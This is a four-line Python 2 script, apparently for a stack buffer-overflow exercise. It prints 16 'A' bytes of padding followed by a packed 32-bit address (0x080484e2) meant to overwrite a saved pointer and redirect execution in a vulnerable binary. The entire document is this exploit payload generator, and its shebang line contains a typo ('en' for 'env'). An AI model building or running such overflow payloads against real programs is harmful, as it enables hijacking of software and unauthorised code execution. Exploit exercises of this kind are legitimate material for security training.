#!/usr/bin/en python
from struct import pack
sfp = pack("<I",  0x080484e2)
print  'A'*16+sfp

